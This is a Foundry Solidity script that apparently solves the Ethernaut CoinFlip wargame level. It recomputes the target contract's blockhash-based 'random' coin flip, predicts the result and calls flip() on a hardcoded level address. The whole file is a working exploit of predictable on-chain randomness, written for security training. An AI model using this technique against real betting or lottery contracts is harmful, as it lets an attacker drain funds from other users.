// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/03_CoinFlip.sol";

contract ExploitScript is Script {

    CoinFlip public level03 = CoinFlip(0x81FC7c338467743CE79A85EFe10bDc9A41a8753A);
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function run() external {
        vm.startBroadcast();
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        level03.flip(side);
        console.log(level03.consecutiveWins());
        vm.stopBroadcast();
    }
}